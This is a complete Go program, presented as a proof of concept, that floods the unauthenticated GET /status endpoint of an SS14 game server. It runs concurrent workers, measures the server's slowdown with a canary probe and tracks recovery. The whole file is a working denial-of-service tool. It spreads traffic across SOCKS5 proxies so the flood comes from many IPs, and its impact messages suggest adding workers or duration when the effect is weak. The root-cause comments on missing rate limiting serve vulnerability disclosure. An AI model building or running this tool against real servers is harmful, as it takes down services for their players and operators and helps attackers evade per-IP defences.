/*
 * PoC: L7 DDoS — Live HTTP Flood  (SS14 StatusHost)
 * ─────────────────────────────────────────────────────────────────────────────
 *
 * Root cause (game-server codebase):
 *
 *   Content.Server/Preferences/Managers/ServerPreferencesManager.cs
 *
 *   private async void HandleUpdateCharacterMessage(MsgUpdateCharacter msg) {
 *       await SetProfile(msg.MsgChannel.UserId, msg.Slot, msg.Profile); // NO rate limit
 *   }
 *   public async Task SetProfile(...) {
 *       await _db.SaveCharacterSlotAsync(userId, profile, slot);        // DB write per msg
 *   }
 *
 * The same root cause exists in the HTTP StatusHost: every GET /status request
 * triggers unbounded server work (JSON serialization, player-count queries) with
 * no rate limiting on the unauthenticated endpoint exposed on the game port.
 *
 * Three-phase test:
 *   L1  Baseline   — 10 sequential probes, measure normal RTT.
 *   L2  Flood      — N concurrent workers saturate /status while an independent
 *                    canary probe tracks response-time degradation in real time.
 *   L3  Recovery   — Flood stops; canary monitors time-to-recover to baseline.
 *
 * SOCKS5 support:
 *   Provide a single proxy with -socks5 or a file of proxies with -socks5-list.
 *   Workers are assigned proxies in round-robin, allowing the flood traffic to
 *   originate from multiple IPs.
 *
 * Usage:
 *   ./l7poc [flags] <host> [port]
 *
 *   -workers int         Concurrent flood workers        (default 50)
 *   -duration int        Flood duration in seconds       (default 30)
 *   -timeout int         Per-request timeout in ms       (default 5000)
 *   -socks5 string       SOCKS5 proxy: [user:pass@]host:port
 *   -socks5-list string  File with proxies, one per line
 *
 * Proxy file format (one entry per line, blank lines and # comments ignored):
 *   host:port
 *   user:pass@host:port
 *
 * ⚠  WARNING: Only use against servers you own or have explicit written
 *    authorisation to test. Unauthorised use may be illegal.
 *
 * Build:
 *   go mod tidy && go build -o l7poc .
 */

package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math"
	"net"
	"net/http"
	"os"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

// ── ANSI colours ──────────────────────────────────────────────────────────────

const (
	cReset  = "\033[0m"
	cBold   = "\033[1m"
	cRed    = "\033[31m"
	cGreen  = "\033[32m"
	cYellow = "\033[33m"
	cCyan   = "\033[36m"
	cGray   = "\033[90m"
)

// ── Types ─────────────────────────────────────────────────────────────────────

// proxyConf holds parsed SOCKS5 proxy credentials.
type proxyConf struct {
	addr     string // host:port
	username string
	password string
}

// appConfig is the resolved CLI configuration.
type appConfig struct {
	host     string
	port     int
	workers  int
	duration time.Duration
	timeout  time.Duration
	proxies  []proxyConf
}

// safeSlice is a goroutine-safe int64 accumulator.
type safeSlice struct {
	mu   sync.Mutex
	data []int64
}

func (s *safeSlice) add(v int64) {
	s.mu.Lock()
	s.data = append(s.data, v)
	s.mu.Unlock()
}

// drain returns all values since the last call and resets the buffer.
func (s *safeSlice) drain() []int64 {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := s.data
	s.data = nil
	return out
}

func (s *safeSlice) snapshot() []int64 {
	s.mu.Lock()
	defer s.mu.Unlock()
	cp := make([]int64, len(s.data))
	copy(cp, s.data)
	return cp
}

// ── Entry point ───────────────────────────────────────────────────────────────

func main() {
	fWorkers  := flag.Int("workers", 50, "Concurrent flood workers (int)")
	fDuration := flag.Int("duration", 30, "Flood duration, seconds (int)")
	fTimeout  := flag.Int("timeout", 5000, "Per-request timeout, milliseconds (int)")
	fSocks5   := flag.String("socks5", "", "Single SOCKS5 proxy: [user:pass@]host:port")
	fS5List   := flag.String("socks5-list", "", "File with SOCKS5 proxies, one per line")

	flag.Usage = func() {
		fmt.Fprintln(os.Stderr, cBold+"Usage:"+cReset+" l7poc [flags] <host> [port]")
		fmt.Fprintln(os.Stderr)
		fmt.Fprintln(os.Stderr, "  host    Game-server hostname or IP")
		fmt.Fprintln(os.Stderr, "  port    StatusHost HTTP port (default 1212)")
		fmt.Fprintln(os.Stderr)
		fmt.Fprintln(os.Stderr, "Flags:")
		flag.PrintDefaults()
		fmt.Fprintln(os.Stderr, `
Proxy file format (blank lines and # comments are ignored):
  host:port
  user:pass@host:port

Examples:
  l7poc localhost
  l7poc 10.0.0.1 1212 -workers 100 -duration 60
  l7poc myserver -socks5 proxy.example.com:1080
  l7poc myserver -socks5 alice:s3cr3t@proxy.example.com:1080
  l7poc myserver -socks5-list proxies.txt -workers 200`)
	}
	flag.Parse()

	args := flag.Args()
	if len(args) == 0 {
		flag.Usage()
		os.Exit(1)
	}

	host := args[0]
	port := 1212
	if len(args) >= 2 {
		if n, err := fmt.Sscanf(args[1], "%d", &port); n != 1 || err != nil || port < 1 || port > 65535 {
			fatalf("invalid port %q\n", args[1])
		}
	}

	var proxies []proxyConf
	if *fSocks5 != "" {
		p, err := parseProxy(*fSocks5)
		if err != nil {
			fatalf("-socks5: %v\n", err)
		}
		proxies = append(proxies, p)
	}
	if *fS5List != "" {
		ps, err := loadProxyList(*fS5List)
		if err != nil {
			fatalf("-socks5-list: %v\n", err)
		}
		proxies = append(proxies, ps...)
	}

	cfg := appConfig{
		host:     host,
		port:     port,
		workers:  *fWorkers,
		duration: time.Duration(*fDuration) * time.Second,
		timeout:  time.Duration(*fTimeout) * time.Millisecond,
		proxies:  proxies,
	}

	printBanner(cfg)
	runLive(cfg)
}

// ── Banner ────────────────────────────────────────────────────────────────────

func printBanner(cfg appConfig) {
	proxyInfo := "none (direct connection)"
	switch len(cfg.proxies) {
	case 1:
		proxyInfo = "SOCKS5  " + cfg.proxies[0].addr
		if cfg.proxies[0].username != "" {
			proxyInfo += "  (authenticated)"
		}
	default:
		if len(cfg.proxies) > 1 {
			proxyInfo = fmt.Sprintf("SOCKS5  %d proxies, round-robin per worker", len(cfg.proxies))
		}
	}

	w := 68
	line := func(s string) {
		// pad or truncate to exactly w chars of content
		r := []rune(s)
		if len(r) > w {
			r = r[:w-1]
			r = append(r, '…')
		}
		pad := w - len(r)
		fmt.Printf(cCyan+"║ "+cReset+"%s%s"+cCyan+" ║\n"+cReset, string(r), strings.Repeat(" ", pad))
	}
	sep := func() { fmt.Printf(cCyan+"╠%s╣\n"+cReset, strings.Repeat("═", w+2)) }
	top := fmt.Sprintf(cCyan+"╔%s╗\n"+cReset, strings.Repeat("═", w+2))
	bot := fmt.Sprintf(cCyan+"╚%s╝\n"+cReset, strings.Repeat("═", w+2))

	fmt.Print(top)
	line(cBold + "PoC: L7 DDoS — Live HTTP Flood  (SS14 StatusHost)" + cReset)
	line(cGray + "Root cause : No rate limiting on GET /status (StatusHost)" + cReset)
	line(cGray + "Same bug   : MsgUpdateCharacter → SaveCharacterSlotAsync" + cReset)
	sep()
	line(fmt.Sprintf("Target  : %shttp://%s:%d%s", cYellow, cfg.host, cfg.port, cReset))
	line(fmt.Sprintf("Workers : %s%-6d%s Duration : %s%ds%s  Timeout : %s%dms%s",
		cYellow, cfg.workers, cReset,
		cYellow, int(cfg.duration.Seconds()), cReset,
		cYellow, int(cfg.timeout.Milliseconds()), cReset))
	line(fmt.Sprintf("Proxy   : %s%s%s", cYellow, proxyInfo, cReset))
	sep()
	line(cYellow + "⚠  Only test servers you own or have written authorisation to test." + cReset)
	fmt.Print(bot)
	fmt.Println()
}

// ── Phase orchestration ───────────────────────────────────────────────────────

func runLive(cfg appConfig) {
	statusURL := fmt.Sprintf("http://%s:%d/status", cfg.host, cfg.port)
	clients := buildClients(cfg)

	// ── Phase L1: Baseline ────────────────────────────────────────────────────
	printHeader("Phase L1: Baseline  (10 sequential probes)", cCyan)

	fmt.Printf("  Connecting to %s%s%s ... ", cYellow, statusURL, cReset)
	body, err := fetchBody(clients[0], statusURL, cfg.timeout)
	if err != nil {
		fmt.Printf("%sFAILED%s\n  %v\n  Cannot reach server. Aborting.\n", cRed, cReset, err)
		return
	}
	fmt.Printf("%sOK%s\n", cGreen, cReset)
	printServerInfo(body)
	fmt.Println()

	var baselineSamples []int64
	for i := 0; i < 10; i++ {
		c := clients[i%len(clients)]
		ms, ok := probeURL(c, statusURL, cfg.timeout)
		baselineSamples = append(baselineSamples, ms)
		label := fmt.Sprintf("%5d ms", ms)
		if !ok {
			label = "TIMEOUT  "
		}
		fmt.Printf("    %sprobe %2d/10 : %s%s\n", rttColor(ok, ms, 200, 500), i+1, label, cReset)
		time.Sleep(300 * time.Millisecond)
	}

	baselineAvg := avg(baselineSamples)
	baselineP95 := percentile(baselineSamples, 95)
	fmt.Printf("\n  Baseline avg : %s%.1f ms%s\n", cGreen, baselineAvg, cReset)
	fmt.Printf("  Baseline p95 : %s%.1f ms%s\n\n", cGreen, baselineP95, cReset)

	// ── Phase L2: Flood ───────────────────────────────────────────────────────
	printHeader(fmt.Sprintf("Phase L2: HTTP Flood  %d workers × %ds", cfg.workers, int(cfg.duration.Seconds())), cRed)
	fmt.Println("  Flood target  : GET /status  (no rate limiting)")
	fmt.Println("  Root cause    : each request triggers unbounded serialization + state query")
	fmt.Println()

	var (
		fSent   atomic.Int64
		fOk     atomic.Int64
		fErr    atomic.Int64
		fTotMs  atomic.Int64
		fSmpl   atomic.Int64
	)
	canary := &safeSlice{}

	floodCtx, floodCancel := context.WithTimeout(context.Background(), cfg.duration)
	defer floodCancel()

	var wg sync.WaitGroup

	// Flood workers
	for i := 0; i < cfg.workers; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()
			c := clients[idx%len(clients)]
			for {
				if floodCtx.Err() != nil {
					return
				}
				fSent.Add(1)
				// Use context so in-flight requests abort immediately when flood ends
				req, _ := http.NewRequestWithContext(floodCtx, http.MethodGet, statusURL, nil)
				start := time.Now()
				resp, err := c.Do(req)
				ms := time.Since(start).Milliseconds()
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					if resp.StatusCode < 500 {
						fOk.Add(1)
						fTotMs.Add(ms)
						fSmpl.Add(1)
					} else {
						fErr.Add(1)
					}
				} else if floodCtx.Err() == nil {
					// Only count as error if not due to context cancellation
					fErr.Add(1)
				}
			}
		}(i)
	}

	// Independent canary goroutine — uses its own dedicated client
	wg.Add(1)
	go func() {
		defer wg.Done()
		cc := clients[0]
		t := time.NewTicker(500 * time.Millisecond)
		defer t.Stop()
		for {
			select {
			case <-floodCtx.Done():
				return
			case <-t.C:
				ms, ok := probeURL(cc, statusURL, cfg.timeout)
				if ok {
					canary.add(ms)
				} else {
					canary.add(-1) // encode timeout as -1
				}
			}
		}
	}()

	// Dashboard — runs in main goroutine
	const dashW = 80
	hdr := "  t(s) │  RPS   │   OK    │  Err  │ Avg RTT │ Canary RTT │ Degradation"
	fmt.Printf("%s%s\n%s%s\n", cGray, hdr, strings.Repeat("─", len(hdr)), cReset)

	ticker := time.NewTicker(time.Second)
	dashStart := time.Now()
	var prevSent int64
	var allCanary []int64

dashLoop:
	for {
		select {
		case <-floodCtx.Done():
			ticker.Stop()
			break dashLoop
		case <-ticker.C:
			t := time.Since(dashStart).Seconds()
			sent := fSent.Load()
			ok   := fOk.Load()
			errs := fErr.Load()
			smpl := fSmpl.Load()
			totMs := fTotMs.Load()

			rps := sent - prevSent
			prevSent = sent

			var avgRTT float64
			if smpl > 0 {
				avgRTT = float64(totMs) / float64(smpl)
			}

			// Drain canary batch
			for _, v := range canary.drain() {
				if v >= 0 {
					allCanary = append(allCanary, v)
				}
			}

			canaryStr := "   n/a   "
			canaryLast := int64(-1)
			if len(allCanary) > 0 {
				canaryLast = allCanary[len(allCanary)-1]
				canaryStr = fmt.Sprintf("%6d ms ", canaryLast)
			}

			var degradeStr string
			degColor := cGray
			if canaryLast >= 0 && baselineAvg > 0 {
				pct := (float64(canaryLast)/baselineAvg - 1) * 100
				if pct > 200 {
					degradeStr = fmt.Sprintf("%s +%.0f%%", cRed, pct)
					degColor = cRed
				} else if pct > 20 {
					degradeStr = fmt.Sprintf("%s +%.0f%%", cYellow, pct)
					degColor = cYellow
				} else {
					degradeStr = fmt.Sprintf("%s  %.0f%%", cGreen, pct)
					degColor = cGreen
				}
			}

			rowColor := cCyan
			if errs > ok {
				rowColor = cRed
			} else if avgRTT > baselineAvg*3 {
				rowColor = cYellow
			}

			_ = degColor
			fmt.Printf("%s  %4.0fs  │ %6d │ %7d │ %5d │ %5.0f ms │ %s│ %s%s\n",
				rowColor, t, rps, ok, errs, avgRTT, canaryStr, degradeStr, cReset)
		}
	}

	// Wait for all goroutines to exit after context deadline
	wg.Wait()

	// Collect remaining canary samples
	for _, v := range canary.drain() {
		if v >= 0 {
			allCanary = append(allCanary, v)
		}
	}

	// Summary
	fSentFinal := fSent.Load()
	fOkFinal   := fOk.Load()
	fErrFinal  := fErr.Load()
	fSmplFinal := fSmpl.Load()
	fTotFinal  := fTotMs.Load()
	var fAvg float64
	if fSmplFinal > 0 {
		fAvg = float64(fTotFinal) / float64(fSmplFinal)
	}
	errPct := 0.0
	if fSentFinal > 0 {
		errPct = float64(fErrFinal) / float64(fSentFinal) * 100
	}
	var cPeak int64
	var cP95 float64
	for _, v := range allCanary {
		if v > cPeak {
			cPeak = v
		}
	}
	if len(allCanary) > 0 {
		cP95 = percentile(allCanary, 95)
	}

	impact := 0.0
	if baselineAvg > 0 && cP95 > 0 {
		impact = cP95 / baselineAvg
	}
	verdict, vColor := classifyImpact(impact)

	fmt.Println()
	box(cRed, 64, []string{
		fmt.Sprintf("Phase L2 Result"),
		"",
		fmt.Sprintf("  Total requests  : %d", fSentFinal),
		fmt.Sprintf("  Successful      : %d", fOkFinal),
		fmt.Sprintf("  Errors/timeouts : %d  (%.1f%%)", fErrFinal, errPct),
		fmt.Sprintf("  Avg flood RTT   : %.0f ms   (baseline %.0f ms)", fAvg, baselineAvg),
		fmt.Sprintf("  Canary peak RTT : %d ms", cPeak),
		fmt.Sprintf("  Canary p95 RTT  : %.0f ms  (baseline p95 %.0f ms)", cP95, baselineP95),
		"",
		fmt.Sprintf("  %s%s%s", vColor, verdict, cReset),
	})

	// ── Phase L3: Recovery ────────────────────────────────────────────────────
	fmt.Println()
	printHeader("Phase L3: Recovery  (up to 30 probes after flood)", cGreen)
	fmt.Println("  Monitoring until RTT returns to baseline ×1.5 threshold...")
	fmt.Println()

	hdr3 := "  t(s) │ RTT       │ Δ baseline │ Status"
	fmt.Printf("%s%s\n%s%s\n", cGray, hdr3, strings.Repeat("─", len(hdr3)), cReset)

	threshold := baselineAvg * 1.5
	recStart := time.Now()
	recoveredN := 0

	for i := 0; i < 30; i++ {
		time.Sleep(time.Second)
		t := time.Since(recStart).Seconds()
		ms, ok := probeURL(clients[0], statusURL, cfg.timeout)

		var rttStr, deltaStr, statusStr string
		rowColor := cGray

		if !ok {
			rttStr   = " TIMEOUT"
			deltaStr = "    n/a    "
			statusStr = "TIMEOUT"
			rowColor = cRed
		} else {
			delta := float64(ms) - baselineAvg
			rttStr   = fmt.Sprintf("%6d ms ", ms)
			deltaStr  = fmt.Sprintf("%+.0f ms   ", delta)
			if float64(ms) <= threshold {
				statusStr = "RECOVERED"
				rowColor = cGreen
				recoveredN++
			} else {
				statusStr = "elevated"
				rowColor = cYellow
			}
		}

		fmt.Printf("%s  %4.0fs  │ %s│ %-11s│ %s%s\n",
			rowColor, t, rttStr, deltaStr, statusStr, cReset)

		if recoveredN >= 3 {
			break
		}
	}

	fmt.Println()
	elapsed := time.Since(recStart).Seconds()
	if recoveredN >= 3 {
		fmt.Printf("%s  Server recovered in ~%.1fs after flood stopped.%s\n\n", cGreen, elapsed, cReset)
	} else {
		fmt.Printf("%s  Server did NOT fully recover within 30s.%s\n\n", cRed, cReset)
	}

	fmt.Printf("%sPoC complete.%s\n", cGray, cReset)
}

// ── HTTP helpers ──────────────────────────────────────────────────────────────

// buildClients creates one *http.Client per unique proxy, or one direct client.
func buildClients(cfg appConfig) []*http.Client {
	if len(cfg.proxies) == 0 {
		return []*http.Client{makeClient(nil, cfg.timeout)}
	}
	cs := make([]*http.Client, len(cfg.proxies))
	for i, p := range cfg.proxies {
		pp := p
		cs[i] = makeClient(&pp, cfg.timeout)
	}
	return cs
}

// makeClient builds an *http.Client, optionally routing through a SOCKS5 proxy.
func makeClient(p *proxyConf, timeout time.Duration) *http.Client {
	tr := &http.Transport{
		MaxIdleConnsPerHost: 200,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   false,
	}

	if p != nil {
		var auth *proxy.Auth
		if p.username != "" {
			auth = &proxy.Auth{User: p.username, Password: p.password}
		}
		d, err := proxy.SOCKS5("tcp", p.addr, auth, proxy.Direct)
		if err == nil {
			// golang.org/x/net SOCKS5 dialer implements proxy.ContextDialer
			if cd, ok := d.(proxy.ContextDialer); ok {
				tr.DialContext = cd.DialContext
			} else {
				// Fallback for older library versions
				tr.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
					return d.Dial(network, addr)
				}
			}
		}
	}

	return &http.Client{
		Transport: tr,
		Timeout:   timeout,
	}
}

// probeURL performs a single GET and returns (latency_ms, success).
func probeURL(c *http.Client, url string, timeout time.Duration) (ms int64, ok bool) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, false
	}
	start := time.Now()
	resp, err := c.Do(req)
	ms = time.Since(start).Milliseconds()
	if err != nil {
		return ms, false
	}
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	return ms, resp.StatusCode < 500
}

// fetchBody performs a GET and returns the response body as a string.
func fetchBody(c *http.Client, url string, timeout time.Duration) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return "", err
	}
	resp, err := c.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	return string(b), err
}

// printServerInfo pretty-prints name and player count from a /status JSON body.
func printServerInfo(body string) {
	var m map[string]any
	if json.Unmarshal([]byte(body), &m) != nil {
		return
	}
	if name, ok := m["name"].(string); ok {
		fmt.Printf("  Server name  : %s\n", name)
	}
	if players, ok := m["players"].(float64); ok {
		fmt.Printf("  Player count : %d\n", int(players))
	}
}

// ── Proxy parsing ─────────────────────────────────────────────────────────────

// parseProxy parses "[user:pass@]host:port" into a proxyConf.
func parseProxy(s string) (proxyConf, error) {
	var p proxyConf
	if at := strings.LastIndex(s, "@"); at >= 0 {
		creds := s[:at]
		p.addr = s[at+1:]
		colon := strings.Index(creds, ":")
		if colon < 0 {
			return p, fmt.Errorf("credentials must be user:pass, got %q", creds)
		}
		p.username = creds[:colon]
		p.password = creds[colon+1:]
	} else {
		p.addr = s
	}
	if p.addr == "" {
		return p, fmt.Errorf("empty proxy address")
	}
	if _, _, err := net.SplitHostPort(p.addr); err != nil {
		return p, fmt.Errorf("invalid address %q: %v", p.addr, err)
	}
	return p, nil
}

// loadProxyList reads a proxy-per-line file.
func loadProxyList(path string) ([]proxyConf, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var out []proxyConf
	sc := bufio.NewScanner(f)
	ln := 0
	for sc.Scan() {
		ln++
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		p, err := parseProxy(line)
		if err != nil {
			return nil, fmt.Errorf("line %d: %v", ln, err)
		}
		out = append(out, p)
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no valid proxies found in %q", path)
	}
	return out, sc.Err()
}

// ── Statistics ────────────────────────────────────────────────────────────────

func avg(data []int64) float64 {
	if len(data) == 0 {
		return 0
	}
	var sum int64
	for _, v := range data {
		sum += v
	}
	return float64(sum) / float64(len(data))
}

func percentile(data []int64, p float64) float64 {
	if len(data) == 0 {
		return 0
	}
	sorted := make([]int64, len(data))
	copy(sorted, data)
	sort.Slice(sorted, func(i, j int) bool { return sorted[i] < sorted[j] })
	idx := int(math.Ceil(p/100*float64(len(sorted)))) - 1
	if idx < 0 {
		idx = 0
	}
	if idx >= len(sorted) {
		idx = len(sorted) - 1
	}
	return float64(sorted[idx])
}

func classifyImpact(ratio float64) (verdict, color string) {
	switch {
	case ratio >= 3:
		return "☠  CONFIRMED — server significantly degraded under flood.", cRed
	case ratio >= 1.5:
		return "⚠  PARTIAL  — latency elevated; try more workers or longer duration.", cYellow
	default:
		return "✅ No significant impact — server may be well-resourced or protected.", cGreen
	}
}

// ── UI helpers ────────────────────────────────────────────────────────────────

func printHeader(title, color string) {
	fmt.Printf("%s═══ %s ═══%s\n", color, title, cReset)
}

// rttColor returns an ANSI colour based on probe success and latency thresholds.
func rttColor(ok bool, ms, warnMs, errMs int64) string {
	if !ok || ms >= errMs {
		return cRed
	}
	if ms >= warnMs {
		return cYellow
	}
	return cGreen
}

// box draws a simple bordered box around a slice of lines.
func box(color string, width int, lines []string) {
	top := color + "┌" + strings.Repeat("─", width) + "┐" + cReset
	bot := color + "└" + strings.Repeat("─", width) + "┘" + cReset
	fmt.Println(top)
	for _, l := range lines {
		runes := []rune(l)
		if len(runes) > width-2 {
			runes = append(runes[:width-3], '…')
		}
		pad := width - 2 - len(runes)
		if pad < 0 {
			pad = 0
		}
		fmt.Printf(color+"│ "+cReset+"%s%s"+color+" │"+cReset+"\n", string(runes), strings.Repeat(" ", pad))
	}
	fmt.Println(bot)
}

func fatalf(format string, a ...any) {
	fmt.Fprintf(os.Stderr, cRed+"error: "+cReset+format, a...)
	os.Exit(1)
}
